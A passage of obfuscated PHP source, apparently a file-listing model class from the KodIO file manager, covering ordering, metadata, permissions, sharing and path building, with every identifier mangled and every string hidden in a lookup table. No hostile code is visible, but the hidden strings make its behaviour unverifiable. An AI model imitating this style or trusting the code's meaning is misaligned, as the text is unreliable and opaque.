$ñÔ¼î˜ò); } else { $ñÔ¼î˜ò .= $¬üòì[537] . $èïéƒ˜Š[1]; } $›¬·ßêÌ = array(); foreach ($ò…¹•€ as $ç˜²¸Ñå => $•ÔÆ–èä) { $›¬·ßêÌ[$¬üòì[530] . $ç˜²¸Ñå] = $•ÔÆ–èä; } $this->alias($¬üòì[538])->field($ŞöÑ™Ÿ÷)->limit($ßƒÎ¶¤)->order($ñÔ¼î˜ò); $‘½º”Ú‚ = $this->join($¢®Éİß)->where($›¬·ßêÌ)->select(); if ($‘½º”Ú‚) { $ŠÕÁØ¢[$¬üòì[455]] = $‘½º”Ú‚; } } protected function _makeOrder($Ó»£ëõü = false) { $ĞåÌò¶ì =& $_SERVER[áäÒ½¯Ç]; $˜ıÉºìÕ = Model($ĞåÌò¶ì[539])->get($ĞåÌò¶ì[540]); $Ç¬ö”Ş = Model($ĞåÌò¶ì[539])->get($ĞåÌò¶ì[541]); $®Ï¨“è• = array($ĞåÌò¶ì[542] => $ĞåÌò¶ì[543], $ĞåÌò¶ì[544] => $ĞåÌò¶ì[545]); $ÇêÖ¦Æ = array($ĞåÌò¶ì[32] => $ĞåÌò¶ì[32], $ĞåÌò¶ì[79] => $ĞåÌò¶ì[79], $ĞåÌò¶ì[167] => $ĞåÌò¶ì[506], $ĞåÌò¶ì[546] => $ĞåÌò¶ì[546], $ĞåÌò¶ì[547] => $ĞåÌò¶ì[548], $ĞåÌò¶ì[242] => $ĞåÌò¶ì[242], $ĞåÌò¶ì[88] => $ĞåÌò¶ì[88]); $—ë²‡¸ = Input::get($ĞåÌò¶ì[549], $ĞåÌò¶ì[7], $˜ıÉºìÕ, array_keys($ÇêÖ¦Æ)); $‚©ÕÊÏ³ = Input::get($ĞåÌò¶ì[550], $ĞåÌò¶ì[7], $Ç¬ö”Ş, array_keys($®Ï¨“è•)); if (!in_array($—ë²‡¸, array_keys($ÇêÖ¦Æ))) { $—ë²‡¸ = $ĞåÌò¶ì[32]; } if (!in_array($‚©ÕÊÏ³, array_keys($®Ï¨“è•))) { $—ë²‡¸ = $ĞåÌò¶ì[542]; } if ($—ë²‡¸ == $ĞåÌò¶ì[32]) { } $›½´¡î¡ = $ĞåÌò¶ì[551] . $ÇêÖ¦Æ[$—ë²‡¸] . $ĞåÌò¶ì[53] . $®Ï¨“è•[$‚©ÕÊÏ³]; $›½´¡î¡ = rtrim(trim($›½´¡î¡), $ĞåÌò¶ì[50]); if ($Ó»£ëõü) { return array($›½´¡î¡, $®Ï¨“è•[$‚©ÕÊÏ³]); } return $this->order($›½´¡î¡); } protected function _listDataApplyItem($×½Èì€¬, $¿ÄŠïÏÚ = false) { $ïë¹¬Ò¯ = array($×½Èì€¬); $this->_listDataApply($ïë¹¬Ò¯, $¿ÄŠïÏÚ); return $ïë¹¬Ò¯[0]; } protected function _listDataApply(&$‰ä³Ó™Á, $§’÷©è = false) { $æ§ı°– =& $_SERVER[áäÒ½¯Ç]; if (!$‰ä³Ó™Á) { $‰ä³Ó™Á = array(); return; } $Ö¾Ûš‡ = array_to_keyvalue($‰ä³Ó™Á, $æ§ı°–[12], $æ§ı°–[192]); $Ö¾Ûš‡ = array_unique($Ö¾Ûš‡); $Ö¾Ûš‡ = array_to_int($Ö¾Ûš‡); $this->_listSourceCache($‰ä³Ó™Á); if (!$§’÷©è) { $this->_listAppendMeta($‰ä³Ó™Á, $Ö¾Ûš‡); $this->_listAppendFileMeta($‰ä³Ó™Á, $Ö¾Ûš‡); $this->_listAppendChildren($‰ä³Ó™Á, $Ö¾Ûš‡); } $this->_listAppendPath($‰ä³Ó™Á); $this->_listAppendAuth($‰ä³Ó™Á); $this->_listAppendSourceInfo($‰ä³Ó™Á, $Ö¾Ûš‡); $this->_listAppendUser($‰ä³Ó™Á); $this->_listFilterInfo($‰ä³Ó™Á, $§’÷©è); $this->_listAppendAuthSecret($‰ä³Ó™Á); } protected function _listSourceCache($±éÅ¼ñş) { $ªÁòš³ =& $_SERVER[áäÒ½¯Ç]; foreach ($±éÅ¼ñş as $£ã—‘‚‰) { self::$cacheSourceInfo[$ªÁòš³[552] . $£ã—‘‚‰[$ªÁòš³[192]]] = $£ã—‘‚‰; } } protected function _listFilterInfo(&$•›í±å», $Şåå¦ = false) { $ˆúˆ¦¨ =& $_SERVER[áäÒ½¯Ç]; foreach ($•›í±å» as &$ƒ¾Ä£›Ş) { $ƒ¾Ä£›Ş = $this->pathInfoFilter($ƒ¾Ä£›Ş); self::$cachePathInfo[$ˆúˆ¦¨[553] . intval($Şåå¦) . $ˆúˆ¦¨[482] . $ƒ¾Ä£›Ş[$ˆúˆ¦¨[192]]] = $ƒ¾Ä£›Ş; } unset($ƒ¾Ä£›Ş); } protected function _listMake(&$ÑñûöÜ¨) { $ñ­Ì‘¤± =& $_SERVER[áäÒ½¯Ç]; $ÑñûöÜ¨[$ñ­Ì‘¤±[85]] = array(); $ÑñûöÜ¨[$ñ­Ì‘¤±[86]] = array(); foreach ($ÑñûöÜ¨[$ñ­Ì‘¤±[455]] as $ãÈì‹¤Ğ) { $¼³«Ş = $ãÈì‹¤Ğ[$ñ­Ì‘¤±[505]] == 1 ? $ñ­Ì‘¤±[85] : $ñ­Ì‘¤±[86]; $ÑñûöÜ¨[$¼³«Ş][] = $ãÈì‹¤Ğ; } unset($ÑñûöÜ¨[$ñ­Ì‘¤±[455]]); } protected function _listAppendMeta(&$¾îé‡“, $ûÀÊˆ°) { $ªÓ¯ğ©» =& $_SERVER[áäÒ½¯Ç]; $†ó†çË = array($ªÓ¯ğ©»[511] => array($ªÓ¯ğ©»[512], $ûÀÊˆ°)); $½¸İËŒ· = Model($ªÓ¯ğ©»[554])->field($ªÓ¯ğ©»[555])->where($†ó†çË)->select(); if (!$½¸İËŒ·) { return; } $¼®… = array($ªÓ¯ğ©»[556], $ªÓ¯ğ©»[557], $ªÓ¯ğ©»[536]); $ãœ°ıü™ = array(); foreach ($½¸İËŒ· as $ü£ù«Ê²) { if (!isset($ãœ°ıü™[$ü£ù«Ê²[$ªÓ¯ğ©»[192]]])) { $ãœ°ıü™[$ü£ù«Ê²[$ªÓ¯ğ©»[192]]] = array(); } if (in_array($ü£ù«Ê²[$ªÓ¯ğ©»[95]], $¼®…)) { continue; } if ($ü£ù«Ê²[$ªÓ¯ğ©»[95]] == $ªÓ¯ğ©»[558]) { $ü£ù«Ê²[$ªÓ¯ğ©»[460]] = $ªÓ¯ğ©»[559]; } $ãœ°ıü™[$ü£ù«Ê²[$ªÓ¯ğ©»[192]]][$ü£ù«Ê²[$ªÓ¯ğ©»[95]]] = $ü£ù«Ê²[$ªÓ¯ğ©»[460]]; } foreach ($¾îé‡“ as &$•íš‰•ó) { $•íš‰•ó[$ªÓ¯ğ©»[560]] = !1; if (isset($ãœ°ıü™[$•íš‰•ó[$ªÓ¯ğ©»[192]]])) { $•íš‰•ó[$ªÓ¯ğ©»[560]] = $ãœ°ıü™[$•íš‰•ó[$ªÓ¯ğ©»[192]]]; } if ($this->fileIsLock($•íš‰•ó) && $•íš‰•ó[$ªÓ¯ğ©»[507]]) { $¯§¿®ë = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $•íš‰•ó[$ªÓ¯ğ©»[507]][$ªÓ¯ğ©»[508]] = AuthModel::authDisable($•íš‰•ó[$ªÓ¯ğ©»[507]][$ªÓ¯ğ©»[508]], $¯§¿®ë); $•íš‰•ó[$ªÓ¯ğ©»[507]][$ªÓ¯ğ©»[561]][$ªÓ¯ğ©»[507]] = $•íš‰•ó[$ªÓ¯ğ©»[507]][$ªÓ¯ğ©»[508]]; } } unset($•íš‰•ó); } protected function _listAppendFileMeta(&$â„üÏä©, $‹„æşÜ÷) { $ôÈ†‹é´ =& $_SERVER[áäÒ½¯Ç]; $¢ÈÆ¶‘Û = array_to_keyvalue($â„üÏä©, $ôÈ†‹é´[12], $ôÈ†‹é´[562]); $¢ÈÆ¶‘Û = array_filter(array_unique($¢ÈÆ¶‘Û)); $¢ÈÆ¶‘Û = array_to_int($¢ÈÆ¶‘Û); if (!$¢ÈÆ¶‘Û) { return; } $€ï†‚æÑ = array($ôÈ†‹é´[563] => array($ôÈ†‹é´[512], $¢ÈÆ¶‘Û)); $´©¿‹é = $ôÈ†‹é´[564]; $†Ôò¿áİ = Model($ôÈ†‹é´[565])->field($´©¿‹é)->where($€ï†‚æÑ)->select(); $†Ôò¿áİ = array_to_keyvalue($†Ôò¿áİ, $ôÈ†‹é´[562]); $¸üùÓå² = Model($ôÈ†‹é´[566])->field($ôÈ†‹é´[567])->where($€ï†‚æÑ)->select(); $¸üùÓå² = $¸üùÓå² ? $¸üùÓå² : array(); $šá¯Ó = array(); foreach ($¸üùÓå² as $‚ñÂ „ú) { if (!isset($šá¯Ó[$‚ñÂ „ú[$ôÈ†‹é´[562]]])) { $šá¯Ó[$‚ñÂ „ú[$ôÈ†‹é´[562]]] = array(); } $šá¯Ó[$‚ñÂ „ú[$ôÈ†‹é´[562]]][$‚ñÂ „ú[$ôÈ†‹é´[95]]] = $‚ñÂ „ú[$ôÈ†‹é´[460]]; } foreach ($â„üÏä© as &$øÈíí”§) { $áÈ§²Ê˜ = $øÈíí”§[$ôÈ†‹é´[562]]; if (!$áÈ§²Ê˜ || !is_array($†Ôò¿áİ[$áÈ§²Ê˜])) { continue; } $çàé•ÈË = $†Ôò¿áİ[$áÈ§²Ê˜]; $çàé•ÈË[$ôÈ†‹é´[79]] = $øÈíí”§[$ôÈ†‹é´[79]]; $çàé•ÈË[$ôÈ†‹é´[32]] = $øÈíí”§[$ôÈ†‹é´[32]]; if (!$çàé•ÈË[$ôÈ†‹é´[568]]) { Model($ôÈ†‹é´[565])->fileMd5Check($çàé•ÈË); } if (!isset(self::$cacheFileInfo[$ôÈ†‹é´[569] . $áÈ§²Ê˜])) { self::$cacheFileInfo[$ôÈ†‹é´[569] . $áÈ§²Ê˜] = array_merge(array(), $çàé•ÈË); } unset($†Ôò¿áİ[$áÈ§²Ê˜][$ôÈ†‹é´[87]]); $äĞ—²… = isset($šá¯Ó[$áÈ§²Ê˜]) && is_array($šá¯Ó[$áÈ§²Ê˜]) ? $šá¯Ó[$áÈ§²Ê˜] : array(); $øÈíí”§[$ôÈ†‹é´[168]] = array_merge($äĞ—²…, $†Ôò¿áİ[$áÈ§²Ê˜]); if (isset($øÈíí”§[$ôÈ†‹é´[168]][$ôÈ†‹é´[183]])) { $øÈíí”§[$ôÈ†‹é´[183]] = json_decode($øÈíí”§[$ôÈ†‹é´[168]][$ôÈ†‹é´[183]], !0); unset($øÈíí”§[$ôÈ†‹é´[168]][$ôÈ†‹é´[183]]); } } unset($øÈíí”§); } protected function _listAppendSourceInfo(&$±æ•èíü, $áª–Îóç) { $˜›æãª =& $_SERVER[áäÒ½¯Ç]; $«€ºÙéº = Model($˜›æãª[570])->listData(); $¹ù‰¶ Ê = Model($˜›æãª[519])->listData(); $ê°°€«¬ = Model($˜›æãª[509])->listData(); $’øËğåí = Model($˜›æãª[571])->listSimple(); $ª˜¿½èÈ = array_to_keyvalue($«€ºÙéº, $˜›æãª[492]); $ìèö‚ŠÕ = array_to_keyvalue_group($¹ù‰¶ Ê, $˜›æãª[87], $˜›æãª[520]); $ÊÎŞ€• = array_to_keyvalue($ê°°€«¬, $˜›æãª[87]); $ïª÷ãõ¼ = array_to_keyvalue_group($’øËğåí, $˜›æãª[192]); foreach ($±æ•èíü as &$íà¿‡¯ˆ) { $íà¿‡¯ˆ[$˜›æãª[90]] = array($˜›æãª[572] => 0, $˜›æãª[573] => 0, $˜›æãª[574] => 0); if (isset($ÊÎŞ€•[$íà¿‡¯ˆ[$˜›æãª[192]]])) { $íà¿‡¯ˆ[$˜›æãª[90]][$˜›æãª[575]] = 1; $íà¿‡¯ˆ[$˜›æãª[90]][$˜›æãª[576]] = $ÊÎŞ€•[$íà¿‡¯ˆ[$˜›æãª[192]]][$˜›æãª[32]]; } if ($ìèö‚ŠÕ && $ª˜¿½èÈ && isset($ìèö‚ŠÕ[$íà¿‡¯ˆ[$˜›æãª[192]]])) { $íà¿‡¯ˆ[$˜›æãª[90]][$˜›æãª[577]] = array(); foreach ($ìèö‚ŠÕ[$íà¿‡¯ˆ[$˜›æãª[192]]] as $ˆ¯—œÌµ) { $Š˜Ìœ™Ÿ = $ª˜¿½èÈ[$ˆ¯—œÌµ]; $íà¿‡¯ˆ[$˜›æãª[90]][$˜›æãª[577]][] = array($˜›æãª[578] => $Š˜Ìœ™Ÿ[$˜›æãª[492]], $˜›æãª[514] => $Š˜Ìœ™Ÿ[$˜›æãª[32]], $˜›æãª[579] => $Š˜Ìœ™Ÿ[$˜›æãª[580]]); } } if ($ïª÷ãõ¼ && isset($ïª÷ãõ¼[$íà¿‡¯ˆ[$˜›æãª[192]]])) { $íà¿‡¯ˆ[$˜›æãª[90]][$˜›æãª[581]] = array(); foreach ($ïª÷ãõ¼[$íà¿‡¯ˆ[$˜›æãª[192]]] as $ãÊ şúŞ) { $íà¿‡¯ˆ[$˜›æãª[90]][$˜›æãª[581]] = $this->shareFilterShow($ãÊ şúŞ); } } } unset($íà¿‡¯ˆ); return $±æ•èíü; } protected function shareFilterShow($ü°—ƒÎ³) { $’ÙÁ­„ =& $_SERVER[áäÒ½¯Ç]; if (!$ü°—ƒÎ³) { return $ü°—ƒÎ³; } $íşƒ‚œÀ = $’ÙÁ­„[582]; if ($ü°—ƒÎ³[$’ÙÁ­„[583]] == $’ÙÁ­„[91]) { $íşƒ‚œÀ .= $’ÙÁ­„[584]; } if (is_array($ü°—ƒÎ³[$’ÙÁ­„[585]]) && is_array($ü°—ƒÎ³[$’ÙÁ­„[585]][$’ÙÁ­„[586]])) { $ü°—ƒÎ³[$’ÙÁ­„[585]][$’ÙÁ­„[586]] = $’ÙÁ­„[587]; } if (!$–Ä”‰¦[$’ÙÁ­„[588]] && $–Ä”‰¦[$’ÙÁ­„[192]] != $’ÙÁ­„[239]) { $–Ä”‰¦[$’ÙÁ­„[588]] = KodIO::make($–Ä”‰¦[$’ÙÁ­„[192]]); } $ü°—ƒÎ³ = array_field_key($ü°—ƒÎ³, explode($’ÙÁ­„[50], $íşƒ‚œÀ)); return $ü°—ƒÎ³; } protected function _listAppendChildren(&$ıãßéñ, $¥÷µùÏ) { $±æÎøÍÃ =& $_SERVER[áäÒ½¯Ç]; $ú‹ï½®ë = array(); $š¼øè¹‡ = array($±æÎøÍÃ[250] => 0, $±æÎøÍÃ[251] => 0); foreach ($ıãßéñ as &$ùß›ÎÔİ) { if (!$ùß›ÎÔİ[$±æÎøÍÃ[505]]) { continue; } $ú‹ï½®ë[] = intval($ùß›ÎÔİ[$±æÎøÍÃ[192]]); } unset($ùß›ÎÔİ); if (!$ú‹ï½®ë) { return; } $‰Ù—°˜· = array($±æÎøÍÃ[191] => array($±æÎøÍÃ[7], $ú‹ï½®ë), $±æÎøÍÃ[525] => 0); $Æ±û‰Ò = array($±æÎøÍÃ[191], $±æÎøÍÃ[505], $±æÎøÍÃ[589] => $±æÎøÍÃ[590]); $œª„Ò™ = $this->field($Æ±û‰Ò)->where($‰Ù—°˜·)->group($±æÎøÍÃ[591])->select(); $àÕƒòÍ = array(); foreach ($œª„Ò™ as $Ş×—„ßò) { $ÃÁÕ¦˜¿ = $Ş×—„ßò[$±æÎøÍÃ[191]]; $ÚÊ½ÏÛÆ = $Ş×—„ßò[$±æÎøÍÃ[505]] == $±æÎøÍÃ[91] ? $±æÎøÍÃ[251] : $±æÎøÍÃ[250]; if (!isset($àÕƒòÍ[$ÃÁÕ¦˜¿])) { $àÕƒòÍ[$ÃÁÕ¦˜¿] = array($±æÎøÍÃ[250] => 0, $±æÎøÍÃ[251] => 0); } $àÕƒòÍ[$ÃÁÕ¦˜¿][$ÚÊ½ÏÛÆ] += $Ş×—„ßò[$±æÎøÍÃ[590]]; } foreach ($ıãßéñ as &$ùß›ÎÔİ) { if (!$ùß›ÎÔİ[$±æÎøÍÃ[505]]) { continue; } $…¬Íİùƒ = is_array($àÕƒòÍ[$ùß›ÎÔİ[$±æÎøÍÃ[192]]]) ? $àÕƒòÍ[$ùß›ÎÔİ[$±æÎøÍÃ[192]]] : $š¼øè¹‡; $ùß›ÎÔİ[$±æÎøÍÃ[251]] = $…¬Íİùƒ[$±æÎøÍÃ[251]]; $ùß›ÎÔİ[$±æÎøÍÃ[250]] = $…¬Íİùƒ[$±æÎøÍÃ[250]]; unset($ùß›ÎÔİ[$±æÎøÍÃ[506]]); } unset($ùß›ÎÔİ); } protected function _listAppendAuth(&$•ıãö¨) { $“²Ï‚îó =& $_SERVER[áäÒ½¯Ç]; $Ì£€”çî = array(); foreach ($•ıãö¨ as $Î˜â´¶Ú) { if ($Î˜â´¶Ú[$“²Ï‚îó[189]] == self::TYPE_GROUP) { $Ì£€”çî[] = intval($Î˜â´¶Ú[$“²Ï‚îó[192]]); } } if (!$Ì£€”çî) { return; } $“‚ÉÇíÇ = array_to_keyvalue($•ıãö¨, $“²Ï‚îó[192]); $¢ªåå‹İ = Model($“²Ï‚îó[592])->getSourceList($Ì£€”çî, $“‚ÉÇíÇ); $¢Æ¯² = KodUser::isRoot(); foreach ($•ıãö¨ as $‹…Ûğ« => &$Î˜â´¶Ú) { $Î˜â´¶Ú[$“²Ï‚îó[507]] = $¢ªåå‹İ[$Î˜â´¶Ú[$“²Ï‚îó[192]]]; if (!$Î˜â´¶Ú[$“²Ï‚îó[507]] && $Î˜â´¶Ú[$“²Ï‚îó[189]] == self::TYPE_GROUP) { $Î˜â´¶Ú[$“²Ï‚îó[507]] = Action($“²Ï‚îó[593])->pathGroupAuthMake($Î˜â´¶Ú[$“²Ï‚îó[594]]); if (!$Î˜â´¶Ú[$“²Ï‚îó[507]] && !$¢Æ¯²) { $Î˜â´¶Ú[$“²Ï‚îó[244]] = !1; $Î˜â´¶Ú[$“²Ï‚îó[243]] = !1; } } if ($Î˜â´¶Ú[$“²Ï‚îó[507]]) { $Î˜â´¶Ú[$“²Ï‚îó[244]] = AuthModel::authCheckEdit($Î˜â´¶Ú[$“²Ï‚îó[507]][$“²Ï‚îó[508]]); $Î˜â´¶Ú[$“²Ï‚îó[243]] = AuthModel::authCheckView($Î˜â´¶Ú[$“²Ï‚îó[507]][$“²Ï‚îó[508]]); } $this->groupPathDisplay($Î˜â´¶Ú); } unset($Î˜â´¶Ú); } public function _listAppendAuthSecret(&$Í‡‚¤ìÓ) { $á¬‹Ñã =& $_SERVER[áäÒ½¯Ç]; if (Model($á¬‹Ñã[527])->get($á¬‹Ñã[595]) != $á¬‹Ñã[91]) { return; } static $­øü«·¢ = false; if (!$­øü«·¢) { $ÇÈêÛ•˜ = Model($á¬‹Ñã[596]); $¸Øñëò” = Model($á¬‹Ñã[597]); $­øü«·¢ = $¸Øñëò”->listData(); $­øü«·¢ = array_to_keyvalue($­øü«·¢, $á¬‹Ñã[192]); $ŸŠ¤¡õ™ = json_decode(Model($á¬‹Ñã[527])->get($á¬‹Ñã[598]), !0); $ŸŠ¤¡õ™ = array_to_keyvalue($ŸŠ¤¡õ™, $á¬‹Ñã[492]); foreach ($­øü«·¢ as $ñáÛ”…û => $’é„°¿Ì) { $Ú¨ãûƒŸ = $ŸŠ¤¡õ™[$’é„°¿Ì[$á¬‹Ñã[599]]]; if (!$Ú¨ãûƒŸ) { $¸Øñëò”->remove($’é„°¿Ì[$á¬‹Ñã[492]]); unset($­øü«·¢[$ñáÛ”…û]); continue; } $áºÕÏÎÇ = $ÇÈêÛ•˜->listData($Ú¨ãûƒŸ[$á¬‹Ñã[507]]); if (!$áºÕÏÎÇ) { $¸Øñëò”->remove($’é„°¿Ì[$á¬‹Ñã[492]]); unset($­øü«·¢[$ñáÛ”…û]); continue; } $’é„°¿Ì[$á¬‹Ñã[507]] = $áºÕÏÎÇ; $’é„°¿Ì[$á¬‹Ñã[600]] = $Ú¨ãûƒŸ; $’é„°¿Ì[$á¬‹Ñã[601]] = Model($á¬‹Ñã[602])->getInfoSimpleOuter($’é„°¿Ì[$á¬‹Ñã[546]]); $­øü«·¢[$ñáÛ”…û] = $’é„°¿Ì; } } $ç¯ä‡È = USER_ID; $ıÇ¥åîŠ = array(); $¬èÅÈËÜ = $this->_listAppendPath($ıÇ¥åîŠ, !0); foreach ($Í‡‚¤ìÓ as $ñáÛ”…û => &$’é„°¿Ì) { if (!is_array($’é„°¿Ì[$á¬‹Ñã[507]])) { continue; } if ($’é„°¿Ì[$á¬‹Ñã[189]] != $á¬‹Ñã[603]) { continue; } if (isset($­øü«·¢[$’é„°¿Ì[$á¬‹Ñã[192]]])) { $Õ€÷«ã± = $­øü«·¢[$’é„°¿Ì[$á¬‹Ñã[192]]]; if (!is_array($’é„°¿Ì[$á¬‹Ñã[560]])) { $’é„°¿Ì[$á¬‹Ñã[560]] = array(); } $’é„°¿Ì[$á¬‹Ñã[560]][$á¬‹Ñã[604]] = $Õ€÷«ã±[$á¬‹Ñã[599]]; $’é„°¿Ì[$á¬‹Ñã[507]][$á¬‹Ñã[605]] = $Õ€÷«ã±; $’é„°¿Ì[$á¬‹Ñã[507]][$á¬‹Ñã[606]] = $’é„°¿Ì[$á¬‹Ñã[607]]; $’é„°¿Ì[$á¬‹Ñã[507]][$á¬‹Ñã[608]] = $á¬‹Ñã[91]; if ($Õ€÷«ã±[$á¬‹Ñã[546]] != $ç¯ä‡È) { $’é„°¿Ì[$á¬‹Ñã[507]][$á¬‹Ñã[508]] = $’é„°¿Ì[$á¬‹Ñã[507]][$á¬‹Ñã[508]] & $Õ€÷«ã±[$á¬‹Ñã[507]][$á¬‹Ñã[507]]; } continue; } $¼Œ ã„ = $this->parentLevelArray($’é„°¿Ì[$á¬‹Ñã[609]]); $òü×‡‰í = array_reverse($¼Œ ã„); foreach ($òü×‡‰í as $Ëúå¾’ => $”˜ĞïºŸ) { if (!isset($­øü«·¢[$”˜ĞïºŸ])) { continue; } $Õ€÷«ã± = $­øü«·¢[$”˜ĞïºŸ]; $’é„°¿Ì[$á¬‹Ñã[507]][$á¬‹Ñã[605]] = $Õ€÷«ã±; if ($Õ€÷«ã±[$á¬‹Ñã[546]] != $ç¯ä‡È) { $’é„°¿Ì[$á¬‹Ñã[507]][$á¬‹Ñã[508]] = $’é„°¿Ì[$á¬‹Ñã[507]][$á¬‹Ñã[508]] & $Õ€÷«ã±[$á¬‹Ñã[507]][$á¬‹Ñã[507]]; } $©ÄÜ‹°Ì = $á¬‹Ñã[12]; $Ó¶ÉÏ€æ = count($¼Œ ã„) - $Ëúå¾’; for ($è êğ§Í = 0; $è êğ§Í < $Ó¶ÉÏ€æ; $è êğ§Í++) { if (!isset($¬èÅÈËÜ[$¼Œ ã„[$è êğ§Í]])) { $©ÄÜ‹°Ì = $á¬‹Ñã[12]; break; } $©ÄÜ‹°Ì = $©ÄÜ‹°Ì . rtrim($¬èÅÈËÜ[$¼Œ ã„[$è êğ§Í]], $á¬‹Ñã[8]) . $á¬‹Ñã[8]; } $’é„°¿Ì[$á¬‹Ñã[507]][$á¬‹Ñã[606]] = rtrim($©ÄÜ‹°Ì, $á¬‹Ñã[8]) . $á¬‹Ñã[8]; break; } } unset($’é„°¿Ì); } public function groupPathDisplay(&$¼Ö§·ãÄ) { $¹„öºÃ¤ =& $_SERVER[áäÒ½¯Ç]; if ($¼Ö§·ãÄ[$¹„öºÃ¤[189]] != self::TYPE_GROUP) { return; } $À•¢«É± = Model($¹„öºÃ¤[610])->getInfo($¼Ö§·ãÄ[$¹„öºÃ¤[594]]); $İó«Ğø° = $this->parentLevelArray($À•¢«É±[$¹„öºÃ¤[609]]); $‰‘û›” = $¹„öºÃ¤[12]; foreach ($İó«Ğø° as $ëÓÕØÖš) { $±äü“Ï = Model($¹„öºÃ¤[610])->getInfo($ëÓÕØÖš); $‰‘û›” .= $±äü“Ï[$¹„öºÃ¤[90]][$¹„öºÃ¤[192]] . $¹„öºÃ¤[50]; } $¼Ö§·ãÄ[$¹„öºÃ¤[611]] = $À•¢«É±[$¹„öºÃ¤[191]]; $¼Ö§·ãÄ[$¹„öºÃ¤[612]] = $À•¢«É±[$¹„öºÃ¤[609]]; $¼Ö§·ãÄ[$¹„öºÃ¤[613]] = $À•¢«É±[$¹„öºÃ¤[614]]; $¼Ö§·ãÄ[$¹„öºÃ¤[615]] = $‰‘û›” . $À•¢«É±[$¹„öºÃ¤[90]][$¹„öºÃ¤[192]]; } protected function _listAppendPath(&$ßÎ¼ëÙÌ, $ØÑ©Ê×¸ = false) { $‡Àèœ®É =& $_SERVER[áäÒ½¯Ç]; static $¸ı©Œ©ı = array(); $¬±ò¯·â = array(); $Û°·şµ’ = array(); if ($ØÑ©Ê×¸) { return $¸ı©Œ©ı; } foreach ($ßÎ¼ëÙÌ as &$¸¸†ŠÎ¯) { $°ò†Å´„ = $¸¸†ŠÎ¯[$‡Àèœ®É[192]]; if ($¸¸†ŠÎ¯[$‡Àèœ®É[505]] == $‡Àèœ®É[91] && $¸¸†ŠÎ¯[$‡Àèœ®É[191]] != 0) { $¸ı©Œ©ı[$°ò†Å´„] = $¸¸†ŠÎ¯[$‡Àèœ®É[32]]; } if ($¸¸†ŠÎ¯[$‡Àèœ®É[505]] == $‡Àèœ®É[91] && $¸¸†ŠÎ¯[$‡Àèœ®É[191]] == 0) { $¸ı©Œ©ı[$°ò†Å´„] = $this->_listAppendPathRoot($¸¸†ŠÎ¯, array()); } if (isset($Û°·şµ’[$¸¸†ŠÎ¯[$‡Àèœ®É[609]]])) { continue; } $Û°·şµ’[$¸¸†ŠÎ¯[$‡Àèœ®É[609]]] = !0; $åµÖì¨æ = $this->parentLevelArray($¸¸†ŠÎ¯[$‡Àèœ®É[609]]); foreach ($åµÖì¨æ as $¯õ‘¢üâ => $­ßì¹±) { if (isset($¸ı©Œ©ı[$­ßì¹±])) { continue; } if ($¯õ‘¢üâ == 0) { $¸ı©Œ©ı[$­ßì¹±] = $this->_listAppendPathRoot($¸¸†ŠÎ¯, $åµÖì¨æ); } if ($¯õ‘¢üâ != 0) { $¬±ò¯·â[] = $­ßì¹±; } } } unset($¸¸†ŠÎ¯); $¬±ò¯·â = array_unique($¬±ò¯·â); if (count($¬±ò¯·â) > 0) { $’ØäË·¡ = array($‡Àèœ®É[511] => array($‡Àèœ®É[512], $¬±ò¯·â)); if (count($¬±ò¯·â) == 1) { $´¦Ó™Õ  = $this->sourceInfo($¬±ò¯·â[0]); $œîçáİ® = is_array($´¦Ó™Õ ) ? array($´¦Ó™Õ ) : !1; } else { $œîçáİ® = $this->field($‡Àèœ®É[616])->where($’ØäË·¡)->select(); } if (!$œîçáİ®) { $œîçáİ® = array(); } foreach ($œîçáİ® as $İ£ºé õ) { $¸ı©Œ©ı[$İ£ºé õ[$‡Àèœ®É[192]]] = $İ£ºé õ[$‡Àèœ®É[32]]; } } $¬€³˜Õû = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $……îÏº‚ = array(); foreach ($ßÎ¼ëÙÌ as &$¸¸†ŠÎ¯) { $Ä³ª©×² = $¸¸†ŠÎ¯[$‡Àèœ®É[609]]; $ò‰¾äø = $‡Àèœ®É[12]; if (isset($……îÏº‚[$Ä³ª©×²])) { $ò‰¾äø = $……îÏº‚[$Ä³ª©×²]; } else { $åµÖì¨æ = $this->parentLevelArray($¸¸†ŠÎ¯[$‡Àèœ®É[609]]); foreach ($åµÖì¨æ as $¯õ‘¢üâ => $­ßì¹±) { if (isset($¸ı©Œ©ı[$­ßì¹±])) { $ò‰¾äø .= $¸ı©Œ©ı[$­ßì¹±] . $‡Àèœ®É[8]; } } $……îÏº‚[$Ä³ª©×²] = $ò‰¾äø; } $ò‰¾äø .= $¸¸†ŠÎ¯[$‡Àèœ®É[32]]; if ($¸¸†ŠÎ¯[$‡Àèœ®É[505]] == $‡Àèœ®É[91]) { $ò‰¾äø .= $‡Àèœ®É[8]; } $¸¸†ŠÎ¯[$‡Àèœ®É[607]] = str_replace($‡Àèœ®É[265], $‡Àèœ®É[8], $ò‰¾äø); if ($¸¸†ŠÎ¯[$‡Àèœ®É[191]] == $‡Àèœ®É[239]) { $¸¸†ŠÎ¯[$‡Àèœ®É[32]] = trim($¸ı©Œ©ı[$¸¸†ŠÎ¯[$‡Àèœ®É[192]]], $‡Àèœ®É[8]); $¸¸†ŠÎ¯[$‡Àèœ®É[607]] = $¸¸†ŠÎ¯[$‡Àèœ®É[32]] . $‡Àèœ®É[8]; } if (intval($¸¸†ŠÎ¯[$‡Àèœ®É[189]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($¸¸†ŠÎ¯, $åµÖì¨æ, $¬€³˜Õû); } } unset($¸¸†ŠÎ¯); return $ßÎ¼ëÙÌ; } private function _listAppendPathRecycle(&$°“÷¥‚à, $±œûÑ—÷, $£Í¸´Èã) { $š¦Á©Ö¬ =& $_SERVER[áäÒ½¯Ç]; if (!in_array($£Í¸´Èã, $±œûÑ—÷) && $°“÷¥‚à[$š¦Á©Ö¬[192]] != $£Í¸´Èã) { return; } $Ó³¯õâ„ = explode($š¦Á©Ö¬[8], trim($°“÷¥‚à[$š¦Á©Ö¬[607]], $š¦Á©Ö¬[8])); $¿÷éÈæ™ = implode($š¦Á©Ö¬[8], array_slice($Ó³¯õâ„, 2)); $°“÷¥‚à[$š¦Á©Ö¬[607]] = $š¦Á©Ö¬[8] . LNG($š¦Á©Ö¬[617]) . $š¦Á©Ö¬[8] . ltrim($¿÷éÈæ™, $š¦Á©Ö¬[8]); $°“÷¥‚à[$š¦Á©Ö¬[609]] = $š¦Á©Ö¬[618] . implode($š¦Á©Ö¬[50], array_slice($±œûÑ—÷, 1)) . $š¦Á©Ö¬[50]; if 